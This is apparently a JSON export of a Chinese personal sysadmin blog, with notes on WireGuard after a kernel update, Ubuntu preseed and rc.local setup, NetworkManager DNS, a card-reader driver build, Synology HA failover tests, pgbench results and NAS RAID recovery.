Uninstallation - Deleting from: /lib/modules/4.15.0-101-generic/updates/dkms/ - Original module - No original module was found for this module on this kernel. - Use the dkms install command to reinstall any previous module version. depmod.... DKMS: uninstall completed. ------------------------------ Deleting module version: 1.0.20200426 completely from the DKMS tree. ------------------------------ Done. Unpacking wireguard-dkms (1.0.20200611-0ppa1~18.04) over (1.0.20200426-0ppa1~18.04) ... 設定 wireguard-dkms (1.0.20200611-0ppa1~18.04) ... Loading new wireguard-1.0.20200611 DKMS files... Building for 4.15.0-106-generic Building initial module for 4.15.0-106-generic Done. wireguard: Running module version sanity check. - Original module - No original module exists within this kernel - Installation - Installing to /lib/modules/4.15.0-106-generic/updates/dkms/ depmod... DKMS: install completed. Updating loolwsd systemplate 跑完之後重起wireguard interface 就 OK 了\nroot@hqdc034:~# wg-quick up wg0 [#] ip link add wg0 type wireguard [#] wg setconf wg0 /dev/fd/63 [#] ip -4 address add 192.168.10.2/24 dev wg0 [#] ip link set mtu 1420 up dev wg0 [#] resolvconf -a tun.wg0 -m 0 -x [#] ip -4 route add 140.112.0.0/16 dev wg0 [#] ip -4 route add 104.31.0.0/16 dev wg0 root@hqdc034:~# ip a 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: enp3s0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:10:18:14:0f:0a brd ff:ff:ff:ff:ff:ff inet 192.168.11.34/24 brd 192.168.0.255 scope global enp3s0 valid_lft forever preferred_lft forever inet6 fe80::2537:5b36:df2:7c0e/64 scope link valid_lft forever preferred_lft forever 3: enp0s31f6: \u0026lt;NO-CARRIER,BROADCAST,MULTICAST,UP\u0026gt; mtu 1500 qdisc fq_codel state DOWN group default qlen 1000 link/ether 70:4d:7b:a3:66:f1 brd ff:ff:ff:ff:ff:ff 30: wg0: \u0026lt;POINTOPOINT,NOARP,UP,LOWER_UP\u0026gt; mtu 1420 qdisc noqueue state UNKNOWN group default qlen 1000 link/none inet 192.168.10.2/24 scope global wg0 valid_lft forever preferred_lft forever root@hqdc034:~# ip r default via 192.168.11.253 dev enp3s0 src 192.168.11.34 metric 202 10.25.0.0/16 dev LoyaltyNet proto kernel scope link src 10.25.25.1 linkdown 104.31.0.0/16 dev wg0 scope link 140.112.0.0/16 dev wg0 scope link 192.168.10.0/24 dev wg0 proto kernel scope link src 192.168.10.2 192.168.11.0/24 dev enp3s0 proto kernel scope link src 192.168.11.34 metric 202 root@hqdc034:~# ","date":"2020-06-22T09:05:42+08:00","image":"https://h.cowbay.org/images/post-default-16.jpg","permalink":"https://h.cowbay.org/post/ubuntu-kernel-4-15-0-106-unable-to-start-wireguard-interface/","title":"Ubuntu 18.04 Kernel 4.15.0-106 Unable to Start Wireguard Interface"},{"content":"ubuntu 18.04 預設移掉了 /etc/rc.local 的功能\n變成要用 systemd 的方式來運作，可是有點難用…\n紀錄一下步驟，再來研究怎麼整合到 preseed 裡面\n1. 建立 rc-local.service sudo vi /etc/systemd/system/rc-local.service [Unit] Description=/etc/rc.local Compatibility ConditionPathExists=/etc/rc.local [Service] Type=forking ExecStart=/etc/rc.local start TimeoutSec=0 StandardOutput=tty RemainAfterExit=yes SysVStartPriority=99 [Install] WantedBy=multi-user.target 2. 建立 rc.local.bak 這個檔案的作用是，我只需要client在PXE 裝完系統後的第一次開機會發通知信件\n所以如果一直保留著 /etc/rc.local 的變動，就變成每次開機都會送出信件\n因此，需要先保留原本的 rc.local\n在送出通知信件之後，就用原來的 rc.local 蓋掉修改過的 rc.local\nsudo vi /etc/rc.local.bak #!/bin/sh -e # # rc.local # # This script is executed at the end of each multiuser runlevel. # Make sure that the script will \u0026#34;exit 0\u0026#34; on success or any other # value on error. # # In order to enable or disable this script just change the execution # bits. # # By default this script does nothing. exit 0 3. 建立 rc.local sudo vi /etc/rc.local #!/bin/sh -e # # rc.local # # This script is executed at the end of each multiuser runlevel. # Make sure that the script will \u0026#34;exit 0\u0026#34; on success or any other # value on error. # # In order to enable or disable this script just change the execution # bits. # # By default this script does nothing. hostname|mail -s pxe_install_complete changch@abc.com cp /etc/rc.local.bak /etc/rc.local exit 0 4. 修改 rc.local permission sudo chmod +x /etc/rc.local 5. 啟用 rc-local service sudo systemctl enable rc-local ubuntu 18.04 preseeds files\n# Title: Ubuntu 18.04 preseed.cfg # # File: templates/os-ubuntu-1804-amd64-preseed.cfg # modified by Eric , 2019/07 ### Localization # Keyboard selection. # Disable automatic (interactive) keymap detection. #d-i console-setup/ask_detect boolean false d-i keyboard-configuration/xkb-keymap select us d-i console-setup/ask_detect boolean false d-i console-setup/layoutcode string us d-i keyboard-configuration/ask_detect boolean false d-i keyboard-configuration/layoutcode string us # The values can also be preseeded individually for greater flexibility. d-i localechooser/preferred-locale string en_US.UTF-8 d-i localechooser/supported-locales en_US.UTF-8 d-i debian-installer/language string en d-i debian-installer/country string US d-i debian-installer/locale string en_US.UTF-8 d-i localechooser/continentlist string Asia ### Network d-i netcfg/choose_interface select auto ### Mirror settings # If you select ftp, the mirror/country string does not need to be set. d-i mirror/country string manual d-i mirror/http/proxy string {{ proxy_env }} d-i mirror/http/hostname string {{ pxe_preseed_mirror }} d-i mirror/http/directory string /ubuntu d-i mirror/http/mirror select {{ pxe_preseed_mirror }} ### Hostname #d-i netcfg/get_hostname string unassigned-hostname #d-i netcfg/get_domain string unassigned-domain d-i netcfg/get_hostname string ubuntu d-i netcfg/get_domain string abc.com ### account d-i passwd/root-login boolean false d-i passwd/user-fullname string Adminstrator d-i passwd/username string administrator d-i passwd/user-password-crypted password $6$random_salt$VaSwPia0/6XHIicZLTaDceuRo/f9A6V4WazuZF/lhgQOhRJcKPO5yZ/ZxtBWrAhlDZOQ7GI3s4bPr9485Shry. d-i user-setup/allow-password-weak boolean true d-i user-setup/encrypt-home boolean false d-i passwd/user-default-groups string audio cdrom video sudo adm ### Clock \u0026amp; Timezone d-i clock-setup/utc boolean true d-i time/zone string {{ pxe_preseed_timezone }} d-i clock-setup/ntp boolean true #d-i tzconfig/gmt boolean true d-i tzconfig/choose_country_zone/Asia select Taipei d-i tzconfig/choose_country_zone_single boolean true # Disable that annoying WEP key dialog. d-i netcfg/wireless_wep string ubuntu ### Partitioning d-i partman-auto/method string regular d-i partman-lvm/device_remove_lvm boolean true d-i partman-md/device_remove_md boolean true d-i partman-lvm/confirm boolean true d-i partman-lvm/confirm_nooverwrite boolean true d-i partman-auto/choose_recipe select default-disk-layout # Or provide a recipe of your own... d-i partman-auto/expert_recipe string \\ default-disk-layout :: \\ 10240 20480 -1 ext4 \\ $primary{ } $bootable{ } \\ method{ format } format{ } \\ use_filesystem{ } filesystem{ ext4 } \\ label{ root } \\ mountpoint{ / } \\ . \\ 1024 2048 200% linux-swap \\ method{ swap } format{ } \\ . \\ d-i partman/default_filesystem string ext4 d-i partman-partitioning/confirm_write_new_label boolean true d-i partman/choose_partition select finish d-i partman/confirm boolean true d-i partman/confirm_nooverwrite boolean true d-i partman/mount_style select uuid ### Base system installation d-i base-installer/kernel/image string linux-generic ### Apt setup d-i apt-setup/restricted boolean true d-i apt-setup/universe boolean true d-i apt-setup/backports boolean true d-i apt-setup/services-select multiselect security d-i apt-setup/security_host string security.ubuntu.com d-i apt-setup/security_path string /ubuntu # Package selection (tasksel --list-tasks) #tasksel tasksel/first multiselect server, openssh-server tasksel tasksel/first multiselect standard, openssh-server, ubuntu-desktop # Individual packages (python-minimal for Ansible) d-i pkgsel/include string ssh net-tools python2.7 axel curl vim unzip zip apt-file lynx elinks sysstat ntp htop screen apt-transport-https wget curl git rsync postfix mailutils # Update policy d-i pkgsel/upgrade select safe-upgrade d-i pkgsel/update-policy select unattended-upgrades popularity-contest popularity-contest/participate boolean false d-i pkgsel/updatedb boolean true ## postfix preseeding postfix postfix/main_mailer_type select Internet Site postfix postfix/mailname string pxe.abc.com postfix postfix/protocols select ipv4 # Reporting popularity-contest popularity-contest/participate boolean false # Bootloader d-i grub-installer/only_debian boolean true d-i grub-installer/with_other_os boolean true d-i finish-install/keep-consoles boolean true d-i finish-install/reboot_in_progress note d-i cdrom-detect/eject boolean true #### Advanced options d-i preseed/late_command string \\ in-target wget --no-proxy http://192.168.1.7/rc-local.service -O /etc/systemd/system/rc-local.service ;\\ in-target wget --no-proxy http://192.168.1.7/rc.local.pxe -O /etc/rc.local.pxe ;\\ in-target wget --no-proxy http://192.168.1.7/rc.local.bak -O /etc/rc.local.bak ;\\ in-target chmod +x /etc/rc.local.pxe ;\\ in-target chmod +x /etc/rc.local.bak ;\\ in-target cp /etc/rc.local.pxe /etc/rc.local ;\\ in-target systemctl enable rc-local ;\\ in-target ln -s /usr/bin/python3.6 /usr/bin/python ","date":"2020-04-08T16:20:33+08:00","image":"https://h.cowbay.org/images/post-default-3.jpg","permalink":"https://h.cowbay.org/post/ubuntu-1804-preseeds/","title":"[筆記] ubuntu 18.04 preseeds "},{"content":"這是之前做過的task，client透過pxe開機後，會自動安裝ubuntu 14.04\n在安裝完成後，會發出郵件通知管理者已經安裝完成\n可是某次ansible 更新之後，反而沒辦法安裝完成\n這次順手修改一下，同時更新了ansible 的template\n###os-ubuntu-1404-desktop-preseed.cfg\n### Localization # Keyboard selection. d-i keyboard-configuration/xkb-keymap select us d-i console-setup/ask_detect boolean false d-i console-setup/layoutcode string us d-i keyboard-configuration/ask_detect boolean false d-i keyboard-configuration/layoutcode string us # The values can also be preseeded individually for greater flexibility. d-i localechooser/preferred-locale string en_US.UTF-8 d-i localechooser/supported-locales en_US.UTF-8 d-i debian-installer/language string en d-i debian-installer/country string US d-i debian-installer/locale string en_US.UTF-8 d-i localechooser/continentlist string Asia ### Network d-i netcfg/choose_interface select auto ### Mirror settings # If you select ftp, the mirror/country string does not need to be set. d-i mirror/country string manual d-i mirror/http/proxy string {{ proxy_env }} d-i mirror/http/hostname string free.nchc.org.tw d-i mirror/http/directory string /ubuntu d-i mirror/http/mirror select free.nchc.org.tw ### Hostname d-i netcfg/get_hostname string ubuntu d-i netcfg/get_domain string abc.com ### account d-i passwd/user-fullname string Adminstrator d-i passwd/username string administrator d-i passwd/user-password-crypted password $6$random_salt$12332112332123123123 d-i user-setup/allow-password-weak boolean true d-i user-setup/encrypt-home boolean false d-i passwd/user-default-groups string audio cdrom video sudo adm ### Clock \u0026amp; Timezone d-i clock-setup/utc boolean true d-i time/zone string Asia/Taipei d-i clock-setup/ntp boolean true #d-i tzconfig/gmt boolean true d-i tzconfig/choose_country_zone/Asia select Taipei d-i tzconfig/choose_country_zone_single boolean true # Disable that annoying WEP key dialog. d-i netcfg/wireless_wep string ubuntu ### Partitioning d-i partman-auto/method string regular d-i partman-lvm/device_remove_lvm boolean true d-i partman-md/device_remove_md boolean true d-i partman-lvm/confirm boolean true d-i partman-lvm/confirm_nooverwrite boolean true d-i partman-auto/choose_recipe select default-disk-layout ### 200% memory as swap , other space mount at / # Or provide a recipe of your own... # 2x physical RAM as swap , remain goes to root in ext4 , no LVM d-i partman-auto/expert_recipe string \\ default-disk-layout :: \\ 10240 20480 -1 ext4 \\ $primary{ } $bootable{ } \\ method{ format } format{ } \\ use_filesystem{ } filesystem{ ext4 } \\ label{ root } \\ mountpoint{ / } \\ . \\ 1024 2048 200% linux-swap \\ method{ swap } format{ } \\ . \\ d-i partman/default_filesystem string ext4 d-i partman-partitioning/confirm_write_new_label boolean true d-i partman/choose_partition select finish d-i partman/confirm boolean true d-i partman/confirm_nooverwrite boolean true d-i partman/mount_style select uuid ### Base system installation d-i base-installer/kernel/image string linux-generic ### Apt setup d-i apt-setup/restricted boolean true d-i apt-setup/universe boolean true d-i apt-setup/backports boolean true d-i apt-setup/services-select multiselect security d-i apt-setup/security_host string security.ubuntu.com d-i apt-setup/security_path string /ubuntu # Package selection (tasksel --list-tasks) # ssh-server for 14.04/16.04 , openssh-server for 18.04 tasksel tasksel/first multiselect ubuntu-desktop,ssh-server # Individual packages (python-minimal for Ansible) #d-i pkgsel/include string python-minimal d-i pkgsel/include string net-tools ssh python2.7 axel curl vim unzip zip apt-file lynx elinks sysstat ntp htop screen apt-tra nsport-https wget curl git rsync postfix mailutils # Update policy #d-i pkgsel/update-policy select none d-i pkgsel/upgrade select safe-upgrade d-i pkgsel/update-policy select unattended-upgrades popularity-contest popularity-contest/participate boolean false d-i pkgsel/updatedb boolean true ## postfix preseeding # General type of configuration? Default:Internet Site # Choices: No configuration, Internet Site, Internet with smarthost, # Satellite system, Local only postfix postfix/main_mailer_type select Internet Site postfix postfix/mailname string pxe.abc.com postfix postfix/protocols select ipv4 # Reporting popularity-contest popularity-contest/participate boolean false # Bootloader d-i grub-installer/only_debian boolean true d-i grub-installer/with_other_os boolean true d-i finish-install/keep-consoles boolean true d-i finish-install/reboot_in_progress note d-i cdrom-detect/eject boolean true #### Advanced options d-i preseed/late_command string \\ in-target apt-file update; \\ #in-target DEBIAN_FRONTEND=noninteractive apt-get install mailutils -y;\\ in-target rm -rf /etc/apt/sources.list.d/ubuntu-esm-infra-trusty.list ; \\ in-target cp /etc/rc.local /etc/rc.local.bak ;\\ in-target /bin/sh -c \u0026#39;echo \u0026#34;hostname|mail -s pxe_install_complete changch@abc.com\u0026#34; \u0026gt; /etc/rc.local\u0026#39; ;\\ in-target /bin/sh -c \u0026#39;echo \u0026#34;cp /etc/rc.local.bak /etc/rc.local\u0026#34; \u0026gt;\u0026gt; /etc/rc.local\u0026#39; ;\\ in-target passwd --expire root ","date":"2020-04-06T10:21:41+08:00","image":"https://h.cowbay.org/images/post-default-5.jpg","permalink":"https://h.cowbay.org/post/ubuntu-1404-preseed/","title":"[筆記] 在 Ubuntu 1404 Preseed 加入開機後自動發郵件通知安裝完成"},{"content":"ubuntu 18.04 的 DNS 設定很煩\n系統預設會用NetworkManager 去管理\n然後NetworkManager 又很「靈活」的許多種修改 /etc/resolv.conf 的方式\n之前都是很粗暴的停用 NetworkManager\n但是用筆電的user 又需要用 NetworkManager 來管理無線網路\n今天找了一下文件，讓NetworkManager 可以執行，卻不會去異動 /etc/resolv.conf\n主要參考這篇文件\nhttps://developer.gnome.org/NetworkManager/stable/NetworkManager.conf.html\n看一下 dns/rc-manager 這兩個部份\n然後修改 /etc/NetworkManager/NetworkManager.conf\n[main] plugins=ifupdown,keyfile dns=none rc-manager=unmanaged [ifupdown] managed=false [device] wifi.scan-rand-mac-address=no 主要就加入第三行和第四行\n接著安裝 resolvconf 這個套件\nsudo apt install resolvconf 修改resolvconf 的config\nsudo vim /etc/resolvconf/resolv.conf.d/head 加入以下內容 nameserver 168.95.1.1 nameserver 8.8.8.8 然後重新啟動 NetworkManager 還有 resolvconf 或者重新開機\n就可以用 resolvconf 來管理 /etc/resolv.conf\n不會再發生DNS 被改成 127.0.0.53 這種怪東西了\n","date":"2020-03-04T16:38:55+08:00","image":"https://h.cowbay.org/images/post-default-17.jpg","permalink":"https://h.cowbay.org/post/config-networkmanager-in-ubuntu-to-stop-modify-resolvconf/","title":"[筆記] 設定ubuntu 18.04 的NetworkManager config 不要更改 /etc/resolv.conf"},{"content":"早上忘了要幹什麼，去看到手上的自然人憑證到期日是今年的 4/17\n想說快到期了，看看能不能線上申請展延\n結果辦公室沒有Linux 可以用的讀卡機\nOOXX 咧，我們可是號稱全Linux 環境捏！\n結果居然沒有對應的硬體！？\n於是馬上敗了一台據說有支援 Linux 的 IT 850UM 讀卡機！\n這是購買的網頁截圖，廠商號稱有支援Linux\n下午到手之後，直接接上去，發現ubuntu 18.04 還的確真的能抓到\n但是，這型號為什麼不太一樣啊？？？怎麼是 IT 500U ??\n先不管，直接開自然人憑證的網頁看能不能抓到..\nhttps://moica.nat.gov.tw/renewcert.html\n當然，事情絕對沒有那麼簡單！\n開啟網頁之後，發現完全抓不到讀卡機！\n啊不是號稱支援 Linux ??\n於是開始翻google 看要怎麼處理\n看到了這篇\nhttp://gholk.github.io/linux-iccard-ccid-compile.html\n不過這篇主要是在說其他的讀卡機，倒不是 it 850UM\n但是一法通、萬法通！\n就去文章裡面提到的連結看看\nhttps://ccid.apdu.fr/\n同樣的，要從 git 下載比較新版的code 回來自己編譯\ngit clone --recursive https://salsa.debian.org/rousseau/CCID.git cd CCID ./bootstrap ./configure make 然後，就報錯了！\n/home/changch/git/CCID/missing: 列 81: flex：命令找不到 WARNING: \u0026#39;flex\u0026#39; is missing on your system. You should only need it if you modified a \u0026#39;.l\u0026#39; file. You may want to install the Fast Lexical Analyzer package: \u0026lt;http://flex.sourceforge.net/\u0026gt; Makefile:958: recipe for target \u0026#39;tokenparser.c\u0026#39; failed make[2]: *** [tokenparser.c] Error 127 make[2]: Leaving directory \u0026#39;/home/changch/git/CCID/src\u0026#39; Makefile:437: recipe for target \u0026#39;all-recursive\u0026#39; failed make[1]: *** [all-recursive] Error 1 make[1]: Leaving directory \u0026#39;/home/changch/git/CCID\u0026#39; Makefile:369: recipe for target \u0026#39;all\u0026#39; failed make: *** [all] Error 2 少了個套件叫 flex，補安裝上去\nsudo apt install flex 然後再跑一次\n./bootstrap ./configure make sudo make install 跑完之後，興沖沖的就去剛剛那個自然人憑證的網頁刷新！\n然後還是沒抓到讀卡機 XDDDD\n認份點，重新開機吧\n重開機之後，再開啟網頁，就可以選擇讀卡機了！\n接下來是關於自然人憑證展延的碎碎念\n在選好讀卡機、輸入個人資料(怪了，不是應該從卡片裡面讀出來嗎？)和PIN碼之後\n按下確認，然後網頁就卡住了\u0026hellip;\n發現是因為會有彈跳視窗，被firefox 給攔下來，放行之後，再按一次確認\n就會看到跳出來的視窗、出現「寫入憑證中」，沒多久就關閉\n又出現一個視窗，出現「讀取憑證中」，也是沒多久就關閉\n然後咧？然後就沒有然後了！！\n視窗還在原地不動，沒有成功、沒有失敗的訊息\n就是個發呆的網頁！什麼提示都沒有！ WTF ！！！！\n想說有出現寫入憑證，應該OK了吧，關掉視窗再來一次，才發現日期已經展延成功了\n真的是很糟糕啊！加個訊息提示很困難嗎？？\n","date":"2020-02-19T16:22:38+08:00","image":"https://h.cowbay.org/images/post-default-9.jpg","permalink":"https://h.cowbay.org/post/install-it500u-card-reader-in-ubuntu-1804/","title":"[筆記] 在ubuntu 18.04 環境下 安裝 it 850UM 讀卡機 展延自然人憑證 / install it 850UM Card Reader in Ubuntu 18.04"},{"content":"前幾天修復了因為intel cpu bug 導致無法使用的 synology DS415+\n詳情請看 https://h.cowbay.org/post/first-try-synology-ha/\n今天趁尾牙前夕，手邊沒啥要緊事\n就來玩玩看promox 加上 synology high availability 再加上 NFS share 的環境\n先上架構圖\n架構很簡單，NAS設定一組NFS share， proxmox mount 進來，然後開一台VM在NFS 上\n主要來談談proxmox 在碰到synology high availability 切換狀態、遇上腦裂(brain split)時候的狀況\n觸發 brain split (說真的，我覺得腦裂很難聽 \u0026hellip;)的情況，在上面連結那篇文章裡面有提到，就不多說了\n來講講後續的狀況\n發生 brain split 時，可以預期管理者會登入管理界面去修復\n關於修復brain split 可以看看群暉的這篇文章\nhttps://www.synology.com/zh-tw/knowledgebase/DSM/help/HighAvailability/split_brain\n而我選擇的是 [將兩台伺服器一同保留於叢集中]\n在進行修復的過程中，會發現VM這邊會變成 read only\n聽起來很合理，畢竟在修復時，所有服務幾乎都是停擺\n但是呢，等到修復完成後，VM還是read only ，這就有點奇怪了\n有跟群暉客服反應過這個狀況\n所以在修復完成之後，在proxmox server 這邊直接對NFS 存取做測試\n去下載一個template 是 OK 的，在console 裡面直接在NFS touch file 也是可以的\n所以Synology high availability 是有正常發揮作用\n而promox 這邊，在synology恢復之後，也可以正常存取NFS ，所以也沒有問題\n那問題就是在VM裡面了，當發生了某些狀況，讓系統進入read only ，就必須透過reboot 才能解決\n或者是看看這個指令用fsck去檢查filesystem 看看有沒有幫助\nsudo fsck -Af -M UPDATE:\n在proxmox 論壇上提出了這個問題，有回覆說要用 NFS Version 4.1\n經過測試，在掛載NFS share folder 時，如果有指定 NFS Version 4.1\n那在HA Cluster 恢復之後，VM也就跟著恢復正常\n不必再重開機了！\n所以這問題算是解決了！\n","date":"2020-01-17T12:20:33+08:00","image":"https://h.cowbay.org/images/post-default-18.jpg","permalink":"https://h.cowbay.org/post/proxmox-with-synology-high-availability/","title":"[筆記] 測試 proxmox 存取由 synology HA cluster 分享的NFS 目錄 / Proxmox With Synology High Availability"},{"content":"上禮拜，原本擔任 proxmox cluster 的主要 storage 的 ds415+ 掛點了\n原因應該就是之前的 intel c2000 series cpu 的 bug\n只是不知道為什麼這台兩三年來都沒有關機的NAS\n比其他三台多撐了那麼久 (已經有兩台送修回來，一台也是同樣症狀，被放在一邊)\n趁著這次機會，看看網路上說的換電阻大法有沒有用！\n如果有用，就拿這兩台來玩玩 synology high availability !\n先要感謝這一篇的作者！\nhttps://www.mobile01.com/topicdetail.php?f=494\u0026t=5600042\n在網路上訂了一大包的 1/4 w 100Ω 的電阻 (100個才70塊，運費都要60了)\n照著上面那篇的作法，把電阻焊上去，NAS就順利開機了！\n__\n架構圖很簡單，只是在做測試而已，又是第一次玩，先不要搞得太複雜\n流程大致如下\n設定好NAS Cluster 之後，建立NFS 服務\n然後在proxmox 主機上掛載這個NFS 空間\n接著在proxmox 上建立一台 VM ，存放在NFS 空間上\n在這台VM裡面持續 ping NAS cluster VIP 192.168.11.85\n接著拔掉 192.168.11.87 的兩條網路線，模擬NAS cluster 的主伺服器掛點的狀況\n這時候VM 還活著，可以正常建立、刪除、檢視檔案，然後 ping 192.168.11.85 也還持續著\nNAS的告警信件也正常發出\n08:53 NAS High Availability 叢集 ds415cluster 已執行自動故障轉移。 [詳細資訊：無法偵測到 hqs087 (主伺服器)] 08:58 NAS High Availability 叢集 ds415cluster 狀態異常 [詳細資訊：無法偵測到 hqs087 (副伺服器)]\n9:08 接回hqs087的網路線\n9:09 收到信件 NAS High Availability 叢集 ds415cluster 停止正常運作 [詳細資訊：Split-brain 錯誤]\n登入管理界面(192.168.11.85:5000) ，操作 HA ，選擇恢復\n這時候開始，VM 的檔案系統變成是 read only\n雖然還活著，但是已經無法建立、刪除檔案，連 cat /var/log/syslog 也會卡住\n9:14 VIP NAS cluster 恢復連線，本來卡住的 cat /var/log/syslog 也可以正常顯示內容了\n但是系統還是 read only，reboot VM 之後才恢復正常。\n有幾個問題\nsplit brain 錯誤 這個問題我想應該是因為只有兩台組成clsuter 造成的\n如果有第三臺加入，應該就不會有這個split brain 的問題\nVM變成 read only 這個我就不知道為什麼了，照理說NAS Cluster 已經開始在恢復\n在我的觀念裡，應該要能夠「正常」的持續服務\n但是VM變成 read only ，而且必須要重新開機才能解決\n那這樣NAS Cluster 等於沒有太大作用呀..\n來問問看群暉客服好了\n","date":"2020-01-10T09:48:18+08:00","image":"https://h.cowbay.org/images/post-default-13.jpg","permalink":"https://h.cowbay.org/post/first-try-synology-ha/","title":"[筆記] 第一次玩 Synology High Availability / first try synology high availability"},{"content":"昨天老闆在slack 上面問說現在的幾台 DB Server 有沒有跑過 pgbench\n分數大概如何，想要跟他的筆電做個比較\n之前有跑過幾次，這次就順便測試一下不同的硬體配置、以及不同的軟體版本\n對於pgbench 跑分會有多大的影響\nOS: ubuntu 18.04.3 x64 postgresql 版本： 10 / 11 / 12 硬碟分成兩種，一個是透過 NFS 10G 網路存取的storage，一個是本機三顆硬碟組成的 zfs raidz\n大概步驟就是安裝postgresql \u0026amp; tools ，然後initialize pgbench table 最後就跑pgbench 測試\ninstall tools for postgresql sudo apt install postgresql-contrib\nsu to postgres and initialize pgbench database sudo su - postgres createdb pgbench pgbench -i -U postgres -s 10 pgbench\nrunning the test pgbench -t 100 -c 100 -S -U postgres pgbench\n得出來的結果如下\n| | 2 cores / 16G | 4 cores / 16G | | \u0026mdash; | \u0026mdash; | \u0026mdash; | PGTUNE | NO PGTUNE | PGTUNE | NO PGTUNE | | PSQL Version | 10G Storage | Local Raidz | 10G Storage | Local Raidz | 10G Storage | Local Raidz | 10G Storage | Local Raidz | | 10 | 9014.144993 | 9395.847239 | 9508.819462 | 10192.27069 | 13280.99918 | 13819.12767 | 15257.69002 | 15397.53475 | | 11 | 9418.477212 | 9333.790266 | 9070.990565 | 9071.182748 | 15455.80444 | 16079.6638 | 15710.24677 | 14274.59939 | | 12 | 8630.21746 | 8872.475173 | 9072.034237 | 9217.547833 | 16116.7502 | 12380.71452 | 17409.10363 | 14520.79393 |\nUpdate: 喵的 Markdown 的表格不支援 colspan ，只好改用圖片方式呈現\n另外補上一個 2 cores / 2G RAM 的結果\npostgresql 10 , 2G RAM , HDD on 10G Storage postgres@ubuntu:~$ pgbench -t 100 -c 100 -S -U postgres pgbench starting vacuum...end. transaction type: \u0026lt;builtin: select only\u0026gt; scaling factor: 10 query mode: simple number of clients: 100 number of threads: 1 number of transactions per client: 100 number of transactions actually processed: 10000/10000 latency average = 11.583 ms tps = 8633.209610 (including connections establishing) tps = 8651.036900 (excluding connections establishing) 有幾個地方值得注意\n記憶體 2G-\u0026gt;16G 效能的增加並沒有很明顯 tps 從 8633 略為上升到 9014\n這個倒是讓我滿意外的，一直以來都認為postgresql 非常的需要記憶體，但是實際跑測試卻不是這樣 pgtune 的影響不大，甚至可以說是會降低效能\npgtune 是一個網頁服務，可以協助做出「理論上」建議使用的postgresql config https://pgtune.leopard.in.ua/#/ 從結果可以看出，使用pgtune 做出來的config ，跟完全使用預設值的config 相比，pgtune的效能大部分都略低於預設值 這也讓我很好奇，或許要花更多時間去研究postgresql 的config，但是，幹！我不是 DBA 啊！ CPU 核心數很明顯地影響pgbench\n從表格中可以看到，當CPU Cores 增加，pgbench的效能也明顯增加 而我甚至還沒有指定用多核心去執行測試，如果要用多核心去測試，要把測試指令改成 pgbench -j 4 -t 100 -c 100 -S -U postgres pgbench 10G Storage和 3顆 2T SATA硬碟組成的 raidz 效能差不多\n如果本機改用 SSD RAID 甚至是 NVME SSD RAID ，效能應該會提高更多 10G的部份最多大概就是略低於 1000MB 左右 如果換成 SSD ，效能應該是還會提昇，但是有限，畢竟10Gb的頻寬限制就在那邊(理論值1250MB左右) ","date":"2020-01-07T11:18:59+08:00","image":"https://h.cowbay.org/images/post-default-17.jpg","permalink":"https://h.cowbay.org/post/postgresql-pgbench-benchmark/","title":"[筆記] postgresql 效能測試 / postgresql benchmakr using pgbench"},{"content":"2020/01/02 , 2020年上工的第一天，群暉的 DS415+ NAS 掛了！\n因為群暉的文件在最關鍵的一步寫得亂七八糟！\n所以在這邊紀錄一下我操作的步驟！\n建立可開機的ubuntu 隨身碟 建立 bootable ubuntu flash 的步驟，請參考底下網頁介紹，這邊就不多說了\nhttps://tutorials.ubuntu.com/tutorial/tutorial-create-a-usb-stick-on-ubuntu#0\n把NAS上的硬碟接上PC 還好這次的NAS只有四顆，如果有八顆，我去哪裡生可以接八顆硬碟的主機\u0026hellip;\n用隨身碟開機進入ubuntu Live 環境 懶人沒截圖\n安裝必要套件 進入 ubuntu Live 之後，按 ctal + alt + t\n開啟 terminal ，然後先安裝 mdadm \u0026amp; lvm2\nubuntu@ubuntu:~$ sudo apt install mdadm lvm2 Reading package lists... Done Building dependency tree Reading state information... Done Suggested packages: thin-provisioning-tools default-mta | mail-transport-agent dracut-core The following NEW packages will be installed: mdadm The following packages will be upgraded: lvm2 1 upgraded, 1 newly installed, 0 to remove and 780 not upgraded. Need to get 1,346 kB of archives. After this operation, 1,237 kB of additional disk space will be used. Get:1 http://archive.ubuntu.com/ubuntu bionic-updates/main amd64 lvm2 amd64 2.02.176-4.1ubuntu3.18.04.2 [930 kB] Get:2 http://archive.ubuntu.com/ubuntu bionic-updates/main amd64 mdadm amd64 4.1~rc1-3~ubuntu18.04.2 [416 kB] Fetched 1,346 kB in 3s (501 kB/s) .... ... ... 以下省略 scan raid and lvm 接下來先換成 root 操作\nubuntu@ubuntu:~$ sudo su - 然後掃描 raid \u0026amp; LVM\nroot@ubuntu:~# mdadm -Asf \u0026amp;\u0026amp; vgchange -ay mdadm: /dev/md/2 has been started with 4 drives. 2 logical volume(s) in volume group \u0026#34;vg1\u0026#34; now active COOL！ 原本的VG出現了！\nroot@ubuntu:~# vgdisplay --- Volume group --- VG Name vg1 System ID Format lvm2 Metadata Areas 1 Metadata Sequence No 3 VG Access read/write VG Status resizable MAX LV 0 Cur LV 2 Open LV 0 Max PV 0 Cur PV 1 Act PV 1 VG Size 5.44 TiB PE Size 4.00 MiB Total PE 1427264 Alloc PE / Size 1427264 / 5.44 TiB Free PE / Size 0 / 0 VG UUID O1c8Uw-JmKy-EiKt-92OB-3K3y-roMi-9NUZ6H 也可以看到 RAID 資訊了！\nroot@ubuntu:~# mdadm -D /dev/md2 /dev/md2: Version : 1.2 Creation Time : Thu Oct 13 07:26:12 2016 Raid Level : raid5 Array Size : 5846077632 (5575.25 GiB 5986.38 GB) Used Dev Size : 1948692544 (1858.42 GiB 1995.46 GB) Raid Devices : 4 Total Devices : 4 Persistence : Superblock is persistent Update Time : Thu Jan 2 01:48:34 2020 State : clean Active Devices : 4 Working Devices : 4 Failed Devices : 0 Spare Devices : 0 Layout : left-symmetric Chunk Size : 64K Consistency Policy : resync Name : video:2 UUID : 18f6706d:91eaaec9:5b0ba8da:e32481e3 Events : 96 Number Major Minor RaidDevice State 0 8 51 0 active sync /dev/sdd3 1 8 35 1 active sync /dev/sdc3 2 8 19 2 active sync /dev/sdb3 3 8 3 3 active sync /dev/sda3 